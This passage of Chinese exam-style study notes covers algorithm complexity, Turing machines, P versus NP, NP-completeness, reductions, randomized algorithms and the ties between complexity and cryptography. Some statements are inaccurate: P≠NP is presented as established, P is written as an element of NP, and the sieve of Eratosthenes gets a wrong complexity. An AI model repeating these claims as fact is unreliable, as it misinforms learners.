c1g(n)≥t(n)≥c2g(n)表达含义：g(n)=该算法的时间复杂度<font color=pink>Ω(g(n))</font>：表达含义：该算法的时间复杂度≥g(n)## <font color=red>7.递归和非递归算法时间效率的数学分析方法区别？</font><p>见5</p><ul><li>思维方式：递归通过将一个复杂问题层层转化为一个与原问题规模更小的同类问题，通过不断缩小问题规模，最终到达基本情况，再将各个小问题的解合起来得到整体解决方案。非递归则是从问题的初始状态逐步迭代到最终解的思维方式。</li><li>实现方式：递归的实现方式是通过函数自身的调用来解决问题。非递归通常使用循环结构，通过迭代更新变量来逐步解决问题。</li><li>空间和时间复杂度：递归在某些情况下会导致大量的函数调用和堆栈空间的使用，可能会占用更多的内存空间，非递归在空间上会更加高效；时间上的效率取决于具体实现的方式和算法。</li></ul><h2 id="8-Fibonacci-numbers-F-N-F-N-1-F-N-2-的时间复杂度表达式？"><a href="#8-Fibonacci-numbers-F-N-F-N-1-F-N-2-的时间复杂度表达式？" class="headerlink" title="8.Fibonacci numbers F(N) = F(N-1) + F(N-2)的时间复杂度表达式？"></a>8.Fibonacci numbers F(N) = F(N-1) + F(N-2)的时间复杂度表达式？</h2><font color=pink>递归法</font>：O(2^N)<font color=pink>公式计算法</font>：O(1)## 9.经典排序问题的算法时间复杂度下界？| 排序方法 | 时间复杂度(平均) | 时间复杂度(最坏) | 时间复杂度(最好) | 空间复杂度 | 稳定性 || :------: | :--------------: | :--------------: | :--------------: | :--------: | :----: || 插入排序 |      O(n^2)      |      O(n^2)      |       O(n)       |    O(1)    |  稳定  || 希尔排序 |     O(n^1.3)     |      O(n^2)      |       O(n)       |    O(1)    | 不稳定 || 选择排序 |      O(n^2)      |      O(n^2)      |      O(n^2)      |    O(1)    | 不稳定 ||  堆排序  |     O(nlogn)     |     O(nlogn)     |     O(nlogn)     |    O(1)    | 不稳定 || 快速排序 |     O(nlogn)     |      O(n^2)      |     O(nlogn)     |  O(logn)   | 不稳定 || 冒泡排序 |      O(n^2)      |      O(n^2)      |       O(n)       |    O(n)    |  稳定  || 归并排序 |     O(nlogn)     |     O(nlogn)     |     O(nlogn)     |    O(n)    |  稳定  ||          |                  |                  |                  |            |        || 基数排序 |      O(n*k)      |      O(n*k)      |      O(n*k)      |   O(n+k)   |  稳定  || 计数排序 |      O(n+k)      |      O(n+k)      |      O(n+k)      |   O(n+k)   |  稳定  ||  桶排序  |      O(n+k)      |      O(n^2)      |       O(n)       |   O(n+k)   |  稳定  |## 10.算法性能提升的本质是什么？提升算法效率的四个层次是什么？<font color=pink>提升的本质</font>：本质是效率，就是让计算机少做事情。效率=产出/所做的事，产出难提高，所做事情可以减少<font color=pink>四个层次</font>：正确性；易读性；健壮性；时空性。## <font color=red>11.为什么超越多项式时间复杂度的精确算法一般是不可接受的？</font><font color=pink>时间复杂度并不表示一个程序解决需要多少时间，而是当问题规模扩大后，程序需要的时间随规模的增长有多快。</font>一个优化问题如果已经找到了多项式时间算法，称该问题为多项式时间可解问题，并将这类问题的集合记为P，即<font color=pink>多项式时间可解问题</font>为P类问题。一个问题没有找到多项式时间算法，在直觉上他是“难解”的，但又无法证明多项式时间算法的不存在性。一方面证明一个问题不存在多项式时间算法是困难的；另一方面，有越来越多的问题无法给出多项式时间算法。<font color=pink>NP-完全性理论的核心思想</font>：如果一个问题是NP类问题，并且存在一个能够在多项式时间内转换为该问题的解的算法，那么该问题就是NP-完全问题。<font color=pink>一个问题是NP-完全问题意味着他是NP类问题中最困难的问题之一</font>。其重要性在于：<font color=red>如果能够证明某个问题是NP-完全问题，那么就可以推导出其他许多问题也是NP-完全问题</font>。## <font color=red>12.什么是图灵机？什么是图灵测试？什么是图灵命题？</font><font color=pink>图灵机</font>：又称图灵计算机，指一种抽象的计算模型，即将人使用纸笔进行数学运算的过程进行抽象，由一个虚拟机器替代人类进行数学运算。其有一个无限长的纸带，纸带分成一个一个方格，每个方格有不同颜色，一个机器头在纸带上移动。机器头有一组内部状态和一些固定程序。每个时刻，机器头从当前纸带读入一个方格的信息，然后结合内部状态查找程序表，根据程序输出信息到纸带方格中，并转换自己的内部状态，进行移动。<font color=pink>图灵测试</font>：指测试者和被测试者隔开的情况下，通过一些装置向被测试者随意提问。进行多次测试后，如果机器让平均每个参与者做出了超过30%的误判，那么这台机器就通过了测试，并认为具有人类智能。<font color=pink>图灵命题</font>：可计算性理论的基本论题，一个函数是可计算的当且仅当可由一部图灵机来计算它。## <font color=red>13.图灵机的基本原理及组成部分？什么是格局？</font><font color=pink>图灵机基本原理</font>：其有一条无限长的纸带，纸带分成一个一个小方格，每个方格有不同的颜色。一个机器头在纸带上移动。机器头有一组内部状态和一些固定程序。每个时刻，机器头从当前纸带读入一个方格的信息，然后结合内部状态查找程序表，根据程序输出信息到纸带方格中，并转换自己的内部状态，进行移动。<font color=pink>组成部分</font>：a.纸带，被分成许多个方格，符号可以写入或者读出；b.可以移动的读写头，能从纸带读取或写入符号；c.指示读写头下一步如何操作的一组规则。d.状态寄存器：保存图灵机当前的状态。<font color=pink>格局</font>：格局是图灵机的一个快照。将图灵机计算过程每一个步骤都找一份快照，通过轨迹将这些快照联系在一起，就可以得到一个数据结构。包括纸带内容，读写头位置和控制机状态。## <font color=red>14.为什么说所有计算或算法都可以由一台图灵机来执行？</font><p>邱奇-图灵论题最基本的观点表明，所有计算或算法都可以由一台图灵机来执行。以任何常规编程语言编写的计算机程序都可以翻译成一台图灵机，反之任何一台图灵机也都可以翻译成大部分编程语言的程序，所以该论题和一下说法等价：常规的编程语言可以足够有效地来表达任何算法。该论题被普遍认定为真。</p><h2 id="15-如何从图灵机视角看待算法的时间复杂度和空间复杂度？"><a href="#15-如何从图灵机视角看待算法的时间复杂度和空间复杂度？" class="headerlink" title="15.如何从图灵机视角看待算法的时间复杂度和空间复杂度？"></a><font color=red>15.如何从图灵机视角看待算法的时间复杂度和空间复杂度？</font></h2><font color=pink>图灵机程序的复杂度</font>由外部的输入和输出来决定图灵机内部的算法的时间和空间的复杂度。<font color=pink>图灵机的时间复杂度T(n)</font>是它处理所有长度为n的输入所需要的最大计算步数。如果对于某个长度为n的输入，图灵机不停机，则T(n)对这个值无定义。<font color=pink>图灵机的空间复杂性S(n)</font>是它处理所有长度为n的输入时，在纸带上所使用过的方格总数。如果某个读写头无限的向右移动而不停机，S(n)也无定义。## <font color=red>16.什么是确定性图灵机、非确定性图灵机和概率图灵机？</font><font color=pink>确定性图灵机(DTM)</font>：在DTM中，其控制规则规定了在任何给定的情况下最多只能执行一个动作。确定性图灵机具有转换功能，对于磁带头下的给定状态和符号，该转换功能指定了三件事：要写入磁带的符号，头部应移动的方向，以及有限控制的后续状态。<font color=pink>非确定性图灵机(NDTM)</font>：在理论计算机科学中，非确定性图灵机是一种理论计算模型，其控制规则在某些给定情况下指定了多个可能的动作。NDTM的下一个状态不是完全由其动作和它所看到的当前符号决定的。<font color=pink>概率图灵机(PTM)</font>：一种非确定型图灵机，每走一步在两个转移函数之间随机地选取一个。概率图灵机是依照随机带上写下的0和1来决定下一步怎么走。## 17.什么是识别问题？<font color=red>什么是判定问题？什么是PT验证器？</font><font color=pink>识别问题</font>：当且仅当图灵机接受字符串时，当提供的输入位于语言中时，语言才是可识别的。此外，如果TM终止并拒绝字符串或根本不终止，则可以识别语言。这意味着当提供的输入不在语言中时，TM继续计算。然而，当且仅当由一台机器在提供的输入位于该语言中时接受字符串并在提供的输入不在该语言中时拒绝该字符串，该语言才是可判定的。<font color=pink>判定问题</font>：有些语言可被判定器判定。如果存在不可判定语言，那么必然存在不可识别语言。就是无法构造一个图灵机，接受这个语言的每一个字符串。所以如果一个语言不可判定，必然它或者它的补是不可识别的。不可识别的语言是存在的。一个不可判定的语言就是一个不可计算的问题。那是一个超出了计算机能力的问题，一个不能被任何有步骤的、确定性的算法所能解决的问题。<font color=pink>即不用求解，判定是否是解</font>,<font color=red>判定比识别要更加严格</font><font color=pink>PT验证器</font>：多项式图灵机## <font color=red>18.什么是P，NP，NPC，NP-hard？</font><font color=pink>P</font>：一个问题如果在图灵机上所需时间不会超过一个确定的多项式，称此类问题的集合为P，通俗来讲，P问题就是多项式时间可解的问题；<font color=pink>NP</font>：可以在非确定型图灵机上在多项式时间内找出解的问题的集合。如果一个问题，可以在多项式时间内验证它的解是否正确，则该问题是一个NP问题。显然 P∈NP(注：到目前为止，P!=NP)<font color=pink>NPC(NP-Complete)</font>：一个决定性问题C若是NPC，则代表它对NP是完备的，这表示：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">a.该问题是一个NP问题</span><br><span class="line">b.所有属于NP的问题都可以归约成该问题</span><br></pre></td></tr></table></figure>对于一个NPC问题，我们不可能尝试将所有的NP规约到它，所以通常采用一下方法证明一个问题是NPC问题：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">a.证明给定问题的一个解，可以在多项式时间验证该问题</span><br><span class="line">b.可以将一个已知的NPC问题归约到该问题</span><br></pre></td></tr></table></figure>在计算复杂度理论中，第一个被证明的NPC问题是布尔可满足性问题。所以<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">可满足问题属于NPC问题。</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">可满足性问题(SAT)：</span><br><span class="line">可满足问题是判断仍以给定的一个布尔表达式是否存在一个真赋值，存在则称该布尔表达式可满足</span><br></pre></td></tr></table></figure><font color=pink>NP-hard</font>:相较于NPC问题，NP-hard问题只满足条件2<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">即所有的NP问题都可以归约到NP-hard问题，即NPC问题可以归约到NP-hard</span><br><span class="line">其次他不一定是NP问题，如下图所示</span><br><span class="line">通常通过将一个已知的NPC问题归约到该问题证明NP-Hard</span><br></pre></td></tr></table></figure><img src="https://qitiantaile.oss-cn-guangzhou.aliyuncs.com/blog/image-20230626195253002.png" alt="image-20230626195253002" style="zoom:60%;" />## <font color=red>19.为什么说计算复杂性理论的首要问题是P=NP？它的内涵是什么？为什么说P=NP不可思议？</font><font color=pink>a</font>.自从P=NP问题被正式提出后，有NP完备理论赋予其在实践上的重要性，有证明复杂性理论赋予其纯数学理论上的重要性，有PCP理论和NP完备理论赋予其算法理论上的重要性。这些理论从根本上依赖P与NP关系问题的某些假设，或者本身就是试图去理解NP和P关系问题而发展出来的。计算复杂性理论的基本的主题之一是算法所需资源的下界。<font color=pink>b</font>.“P/NP”问题，这里的P指多项式时间，假如NP问题能找到算法使其在多项式时间内解决，也就证明了P=NP<font color=pink>c</font>.如果P=NP，那么每个答案很容易得到验证的问题也同样可以轻松求解，这将对计算机安全构成巨大威胁。目前加密系统的破解就相当于要将一个整数分解成几个因数的乘积，正是其求解过程的繁琐，才能杜绝黑客入侵。如果证明了P=NP，那么依据计算复杂性的密码就没有用途。如果P=NP，那么所有的NP问题都存在有效的解决方案，而对于NP-hard问题，及时P=NP，也不一定有解。同时如果证明了P!=NP，那么大素数的分解还是不是NPC的？证明RSA、DES等密码的安全性比证明P/NP还困难。## 20.简述Cook-Levin定理，为什么该定理如此重要？<font color=pink>Cook-Levin定理</font>：表明布尔可满足问题是NPC的。也就是说，NP中的任何问题都可以通过DTM在多项式时间内减少到确定布尔公式是否可满足的问题。如果可以在多项式时间内通过非确定性算法求解，则决策问题在NP中。<font color=pink>为什么如此重要</font>：给定NP中的任何决策问题，构造一个在多项式时间内解决它的非确定性机器。然后，对于该机器的每个输入，构建一个布尔表达式，表示输入传递给机器，机器正确运行并停止回答“是”。证明表明NP中的任何问题都可以在多项式时间中减少到布尔可满足问题的实例。这意味着如果布尔可满足问题可以通过确定性图灵机在多项式时间内解决，则NP中的所有问题都可以在多项式时间内求解，因此证明P=NP## <font color=red>21.什么是归约？常见的归约方法？</font><font color=pink>归约</font>：一个问题A可以归约到一个问题B的含义是可以用解决B的方法解决A，也就是说找到了解决A的方法。因此可知，问题A不一定比问题B难，<font color=pink>即B更难</font>至少两个问题是同样难度的。<font color=pink>详细定义</font>：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">对于问题A和问题B，如果存在一个可计算的函数f，使得对于任意问题A的实例x有：</span><br></pre></td></tr></table></figure>$$A(x) = B(f(x))$$<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">我们就说问题A可以被归约到问题B</span><br><span class="line">归约方法：Many-one归约，图灵归约，Karp归约，Levin归约，Cook归约</span><br></pre></td></tr></table></figure>## <font color=red>22.如何判定一个问题是NPC问题？</font><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">a.是一个NP问题</span><br><span class="line">b.所有NP问题都可归约到它</span><br><span class="line">（见18）</span><br></pre></td></tr></table></figure><h2 id="23-什么是停机判定问题？其哲学思想是什么？"><a href="#23-什么是停机判定问题？其哲学思想是什么？" class="headerlink" title="23.什么是停机判定问题？其哲学思想是什么？"></a><font color=red>23.什么是停机判定问题？其哲学思想是什么？</font></h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">停机判定：给定一个图灵机T和一个任意语言集合S，T是否会最终停机于每一个s∈S。</span><br><span class="line">        即判定一个程序是否会在有限的时间内结束运行。</span><br><span class="line">意义：其意义相同与可确定语言。显然任意有限S是可判定性的，可列S也是停机的。</span><br><span class="line">     即所有能行和计算的算法都是可以得到确定性答案而停机；或</span><br><span class="line">     不存在可以解决问题的确定性算法。</span><br></pre></td></tr></table></figure><font color=brown>注：“停机问题”不可判定意味着“可计算的”机器不能肯定自己的“可计算性”，停机问题这种悖论式解释判定问题只会让问题更难。</font><h2 id="24-求解NP问题的一般方法？"><a href="#24-求解NP问题的一般方法？" class="headerlink" title="24.求解NP问题的一般方法？"></a>24.求解NP问题的一般方法？</h2><p>a.<font color=pink>动态规划法与分支界限法</font>：对于许多NPC问题来说，用此方法可以得到较高的解题效率？<br>b.<font color=pink>概率分析</font>：对于许多NPC问题，其困难实例出现概率小，平均性能好<br>c.<font color=pink>近似算法</font>：近似解代替最优解<br>d.<font color=pink>启发式算法</font>：别的方法不奏效</p><h2 id="25-2SAT为什么是P问题？"><a href="#25-2SAT为什么是P问题？" class="headerlink" title="25.2SAT为什么是P问题？"></a><font color=red>25.2SAT为什么是P问题？</font></h2><font color=pink>2SAT</font>问题之所以属于P问题，是因为存在一种多项式时间复杂度的算法来解决它，也就是<font color=pink>强连通分量算法</font>。其将2SAT问题转化为<font color=pink>有向图问题</font>，并查找图中的强连通分量。此算法可以在多项式时间内完成。<font color=pink>证明如下</font>：![image-20230627212515843](https://qitiantaile.oss-cn-guangzhou.aliyuncs.com/blog/image-20230627212515843.png)[注]：如果xi和 ¬xi属于同一强连通分量，即互相可达，肯定是矛盾式。构造一张有向图G，把其中的每个变量拆成两个节点**2i**和**2i+1**，分别表示**xi**为假和**xi**为真，最后要为每个变量选择其中一个节点打标记。对于“**xi**为假或**xj**为假”这样的条件，我们连一条有向边$$2i+1=>2j$$表示**xi**为真时**xj**必须为假，同理，还需要连一条有向边$$2j+1=>2i$$其他条件类似，每个条件对应两条“**对称**”的边，整张图实际上描述了一系列必须满足的关系，选择**u**的情况下必须选择它所能到的所有点。对于一个没有打标记的变量**xi**，我们先假定它为假，然后标记节点**2i**，并且沿着有向边标记所有能标记的节点。如果标记过程中发现某个变量对应的两个节点都被标记，则“**xi**为假”这个假定不成立，需要改成“**xi**为真，然后重新标记。整个算法没有回溯过程，如果当前考虑的变量不管赋值为真还是假都会引起矛盾，可以证明整个2SAT问题无解。## <font color=red>26.什么是随机算法？作用和意义？举例</font><font color=pink>随机算法</font>是一种使用概率和统计方法在其执行过程中对于下一计算步骤做出随机选择的算法。通常包括：随机生成的随机数和根据这些随机数做出的决策<font color=pink>作用和意义</font>：+ 避免陷入局部最优解+ 探索解空间+ 增加解多样性+ 提高效率举例<font color=pink>举例</font>：数值概率算法、蒙特卡洛算法、拉斯维加斯算法、舍伍德算法；+ 蒙特卡洛算法  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">用于求问题的准确解</span><br><span class="line">对于许多问题来说，近似解无意义，如判定问题；</span><br><span class="line">但所得到的解不一定正确</span><br><span class="line">求得正确解的概率依赖于算法所用的时间，时间越多，概率越大</span><br><span class="line">缺点：无法有效地判别解的正确性</span><br></pre></td></tr></table></figure>+ 拉斯维加斯算法  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">拉斯维加斯算法会得到正确的解；</span><br><span class="line">但算法有时会找不到解</span><br><span class="line">多次求解可减小求解失效的概率</span><br></pre></td></tr></table></figure>+ 舍伍德算法  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">算法总能求得解，并且解是正确的</span><br><span class="line">当一个确定性算法</span><br><span class="line">在最坏情况下的计算复杂性与其在平均情况下的计算复杂性有较大差别时，</span><br><span class="line">可在这个确定性算法中引入随机性；</span><br><span class="line">将其改造为舍伍德算法，减少差别</span><br></pre></td></tr></table></figure>## 27.单向函数的意义及作用？举例<font color=pink>单向函数</font>：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">对于每一个输入，函数值在多项式时间内可解；</span><br><span class="line">对于随机的函数值，无法在多项式时间内使用确定性图灵机计算；</span><br></pre></td></tr></table></figure><font color=pink>意义和作用</font>：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">作用：单向函数一般用于产生消息摘要、密钥加密等，常见有MD5，SHA；</span><br><span class="line">提供数据的保密性、完整性和认证性。</span><br><span class="line">它们为密码学和信息安全领域提供了可靠的工具，使得加密和安全通信成为可能。</span><br><span class="line"></span><br><span class="line">意义：如果单向函数存在，将证明复杂性类P/NP问题中，P不等于NP。</span><br></pre></td></tr></table></figure>## <font color=red>28.交互式证明思想和方法？举例</font><font color=pink>完备性</font>：如果x∈L，则存在一个证明者P使得验证者V能以多项式时间接受x（且接受的概率大于2/3）<font color=pink>可靠性</font>：如果x∉L，对于所有的证明者P，V接受x的概率不会超过1/3能被交互式系统解决的问题记为IP类问题，可以证明NP ⊆ IP<font color=pink>应用</font>：对典型的实际应用就是<font color=pink>零知识证明</font><font color=pink>图的三色问题</font>：为一个无向图的每个节点涂色(红、绿、蓝)，使得相邻节点颜色不同、在交互式证明中，证明者可以声称找到了一个图的有效的三色方案，并于验证者进行交互验证方案的正确性。交互过程如下：+ 验证者随机选择图的一些节点，并要求证明者提供这些节点的颜色方案。+ 证明者根据自己的声称方案提供节点的颜色，并将这些颜色发给验证者。+ 验证者检查证明者提供的颜色方案是否满足相邻节点颜色不同的条件。+ 如果这个验证者发现任何错误，他可以指正并要求证明者提供更多的证据或者修正错误。+ 这个过程可以继续，知道验证者对证明者的声称满意。除了该问题，交互式证明思想还用于素性测试(?)、证明性密码学等领域。## 29.对角线方法思想？举例<font color=pink>思想</font>：利用对角线上的值做反证法。<font color=pink>证明 **N != R**,自然数集与实数集不存在一一对应</font>:+ 假设：<font color=blue>自然数集N</font>和<font color=green>实数集R</font>之间，一定存在映射，即**N**可以进行一一列举出来，f(1)，f(2)....f(n),  f(n)对应的是实数，将其限制在[0,1]之间；  [0,1]之间的实数与整个实数集一定存在一一对应关系。+ 证明<font color=blue>自然数集N</font>和<font color=green>[0,1]区间内的实数</font>，不可能存在一一对应关系：  f(n)是一个[0,1]区间内的实数，则可以写成  f(1) = 0.a11a12a13...  f(2) = 0.a21a22a23...  **.**  **.**  **.**  f(n) = 0.an1an2...ann，其中a的值是0-9中的一个数字；  假设存在一个f是从<font color=blue>自然数集N</font>和<font color=green>[0,1]区间内的实数</font>的一一映射，对于对角线上的元素a11，a22，...，ann  设计一个实数 b = b1b2...bn，其中要求：<font color=red>bi != aii</font><p>  如果<font color=blue>自然数集N</font>和<font color=green>[0,1]区间内的实数</font>是一一对应的，那么<font color=red>一定可以找到一个自然数k</font>，与实数b = b1b2…bn对应，实数b一定等于f(k);</p><p>  与假设<font color=red>矛盾</font>，设计过程要求<font color=red>bk != akk</font>，<font color=red>而f(k)中第k个数值一定是akk</font>，因此两个值不可能相等。</p><h2 id="30-三种基本算法设计范式"><a href="#30-三种基本算法设计范式" class="headerlink" title="30.三种基本算法设计范式"></a>30.三种基本算法设计范式</h2><ul><li><font color=pink>有理论保证的算法</font><ul><li>精确算法</li><li>近似算法</li></ul></li><li><font color=pink>启发式算法</font><ul><li>在现实中往往有很好的性能</li><li>但有时候会崩溃或者性能很差</li></ul></li><li><font color=pink>机器学习习得的算法</font><ul><li>让机器自己学习一个算法</li><li>有一定通用性，但可解释性比较差</li></ul></li></ul><h2 id="31-剖析计算复杂性和密码安全的关系"><a href="#31-剖析计算复杂性和密码安全的关系" class="headerlink" title="31.剖析计算复杂性和密码安全的关系"></a>31.剖析计算复杂性和密码安全的关系</h2><p>计算复杂性理论和密码安全之间存在密切的关系。计算复杂性理论研究问题的难度和解决方案所需的计算资源之间的关系，而密码安全关注如何设计和实现安全的加密和解密算法以保护敏感信息。</p><p>在密码学中，我们希望设计的加密算法具有“计算上的安全性”，即使在有限的计算资源下，攻击者无法有效地破解加密算法。计算复杂性理论提供了关于问题的困难程度和计算资源的理论界限的概念，这对于评估和设计安全的密码算法至关重要。</p><p>例如，基于大整数因子分解问题的RSA加密算法，其安全性依赖于计算大整数的因子分解的困难性。如果存在一种高效算法可以在多项式时间内分解大整数，那么RSA算法的安全性将受到威胁。因此，计算复杂性理论的发展对于验证和加强RSA算法的安全性至关重要。</p><p>此外，计算复杂性理论还为密码学提供了一些基本的概念和工具，例如多项式时间算法、随机性、非确定性等，这些概念和工具被广泛应用于密码学的设计和分析中。</p><p>总之，计算复杂性理论为我们提供了一种理论基础和工具，帮助我们分析和评估密码算法的安全性，并为设计和实现安全的加密算法提供指导。它在密码学的研究和实践中起着重要的作用，确保我们能够设计出抵御计算攻击的强密码系统。</p><h2 id="32-如何理解：计算复杂性理论是计算机科学的哲学"><a href="#32-如何理解：计算复杂性理论是计算机科学的哲学" class="headerlink" title="32.如何理解：计算复杂性理论是计算机科学的哲学"></a>32.如何理解：计算复杂性理论是计算机科学的哲学</h2><ol><li><p>抽象与本质：计算复杂性理论关注问题的本质难度和计算资源之间的关系，它不仅关注具体的算法和实现细节，而是更关注问题的可计算性和难解性。这使得计算复杂性理论具有哲学性质，它探索问题的本质特征和计算的边界。</p></li><li><p>问题的可计算性：计算复杂性理论关注哪些问题是可计算的，哪些问题是不可计算的。它探讨了计算问题的可解性和难解性，帮助我们理解问题的边界和局限性。这与哲学中的思考问题的可知性和认知边界的思想密切相关。</p></li><li><p>算法和计算模型的研究：计算复杂性理论研究了各种算法和计算模型的性质和特征，包括多项式时间算法、非确定性算法、随机算法等。这些研究使得计算复杂性理论具有对计算机科学中基本概念和模型的哲学思考。</p></li><li><p>计算的局限性：计算复杂性理论探讨了计算的局限性和困难性，例如NP完全性理论表明一类问题的解决是困难的，没有高效算法可以解决这些问题。这使得计算复杂性理论与哲学中的认识论和存在论等思想产生共鸣。</p></li></ol><h2 id="33-如何理解随机算法在密码学中的作用和地位？"><a href="#33-如何理解随机算法在密码学中的作用和地位？" class="headerlink" title="33.如何理解随机算法在密码学中的作用和地位？"></a><font color=red>33.如何理解随机算法在密码学中的作用和地位？</font></h2><p><font color=pink>随机算法</font>生成的随机数在密码学中占有重要的地位，几乎所有的密码算法都要用到一些对攻击者来说必须是秘密的数据，而其中<font color=pink>密钥必须是随机数</font>。</p><h2 id="34-简述素数问题PRIME及其复杂性分析？"><a href="#34-简述素数问题PRIME及其复杂性分析？" class="headerlink" title="34.简述素数问题PRIME及其复杂性分析？"></a>34.简述素数问题PRIME及其复杂性分析？</h2><blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">给定M，求[0,M]中素数的个数</span><br></pre></td></tr></table></figure></blockquote><p><font color=orange>复杂性分析</font>：</p><p><font color=pink>穷举法</font>：</p><script type="math/tex; mode=display">O(N^2)</script><p><font color=pink>检测到根号N</font>：</p><script type="math/tex; mode=display">O(根号N)</script><p><font color=pink>埃拉托色尼筛选算法</font>：</p><script type="math/tex; mode=display">O(根号N/logN)</script><p><font color=pink>欧拉筛选法</font>：</p><script type="math/tex; mode=display">O(N)</script><h2 id="35-简述零知识证明的基本思想"><a href="#35-简述零知识证明的基本思想" class="headerlink" title="35.简述零知识证明的基本思想"></a>35.简述零知识证明的基本思想</h2><p>证明者能够在不向验证者提供任何新知识的情况下，使验证者相信某个断言或定理的真实性。</p><h2 id="36-一个算法问题交给你后，应该怎么处理？"><a href="#36-一个算法问题交给你后，应该怎么处理？" class="headerlink" title="36.一个算法问题交给你后，应该怎么处理？"></a>36.一个算法问题交给你后，应该怎么处理？</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">a.建模：对输入参数和解给出形式化或半形式化的描述</span><br><span class="line">b.设计算法：采用什么算法设计</span><br><span class="line"> 正确性：是否所有实例均有正确解</span><br><span class="line">c.分析：分析算法效率</span><br></pre></td></tr></table></figure><h2 id="37-计算复杂性理论的认识？对今后学习的启发？"><a href="#37-计算复杂性理论的认识？对今后学习的启发？" class="headerlink" title="37.计算复杂性理论的认识？对今后学习的启发？"></a>37.计算复杂性理论的认识？对今后学习的启发？</h2><p>计算复杂性理论是计算机科学的一个重要分支，它研究计算问题的难解性和可解性。通过分析问题的复杂性，计算复杂性理论可以帮助我们理解何时可以期望找到高效算法来解决问题，以及何时问题可能是困难甚至是不可解的。</p><p>对于今后的学习，计算复杂性理论给我们带来了以下几个方面的启发：</p><ol><li><p>算法设计的重要性：计算复杂性理论告诉我们，并非所有的问题都可以通过高效的算法解决。对于某些问题，可能不存在多项式时间内解决它们的算法。因此，在学习算法设计和问题求解时，需要考虑问题的复杂性，并寻找合适的算法来解决。</p></li><li><p>问题的可证明性：计算复杂性理论研究问题的难解性和可解性，它提供了一种形式化的框架来研究问题是否可以在有效的时间内解决。这启发我们思考问题的本质和边界，以及寻找问题的可证明性和难解性。</p></li><li><p>理论与实践的结合：计算复杂性理论不仅仅关注问题的理论分析，还与实际问题密切相关。它为算法设计和问题求解提供了基本的指导原则和方法。通过理解计算复杂性理论，我们可以更好地理解和设计高效的算法，提高计算问题的解决效率。</p></li><li><p>密码学和安全性的研究：计算复杂性理论对密码学和安全性的研究有重要的影响。它提供了分析密码算法安全性的工具和方法，帮助我们设计和评估安全的加密算法。</p></li></ol><p>综上所述，计算复杂性理论对于我们理解问题的复杂性、算法设计和问题求解具有重要的启发作用。它提醒我们在实际问题中注重算法效率，并帮助我们更好地理解问题的可解性和难解性，促进了密码学和安全性领域的研究。</p><h2 id="38-结合计算复杂性理论浅谈对云计算、大数据、物联网、人工智能安全思考？"><a href="#38-结合计算复杂性理论浅谈对云计算、大数据、物联网、人工智能安全思考？" class="headerlink" title="38.结合计算复杂性理论浅谈对云计算、大数据、物联网、人工智能安全思考？"></a>38.结合计算复杂性理论浅谈对云计算、大数据、物联网、人工智能安全思考？</h2><p>计算复杂性理论在云计算、大数据、物联网和人工智能安全方面提供了一些重要的思考和指导。下面是对每个领域的简要讨论：</p><ol><li><p>云计算：云计算涉及大规模的计算和存储资源共享，因此安全性是一个关键问题。计算复杂性理论可以帮助我们评估云计算中的安全性问题，例如数据隐私和身份验证。通过分析问题的复杂性，我们可以确定哪些安全问题是难解的，需要采取特定的安全措施来保护数据和系统。</p></li><li><p>大数据：大数据处理涉及海量的数据集和复杂的数据分析算法。计算复杂性理论可以帮助我们设计高效的算法来处理大数据，并评估算法的可扩展性和计算成本。在大数据安全方面，计算复杂性理论也可以帮助我们研究数据加密和访问控制的有效方法，以保护敏感数据的安全。</p></li><li><p>物联网：物联网连接了大量的设备和传感器，因此安全性成为物联网应用的一个重要问题。计算复杂性理论可以帮助我们分析物联网中的安全协议和算法的复杂性，以确定它们是否足够安全和可行。此外，计算复杂性理论还可以帮助我们设计高效的认证和密钥管理方案，以确保物联网设备和通信的安全性。</p></li><li><p>人工智能：人工智能的发展越来越依赖于大规模的数据和复杂的算法模型。计算复杂性理论可以帮助我们评估人工智能算法的计算复杂性，并指导我们选择适当的算法和优化方法来提高性能和效率。在人工智能安全方面，计算复杂性理论还可以帮助我们分析和评估人工智能模型的鲁棒性和防御性，以抵御对抗性攻击和隐私侵犯。</p></li></ol><p>综上所述，计算复杂性理论为云计算、大数据、物联网和人工智能安全提供了思考和指导。它可以帮助我们评估问题的复杂性和可解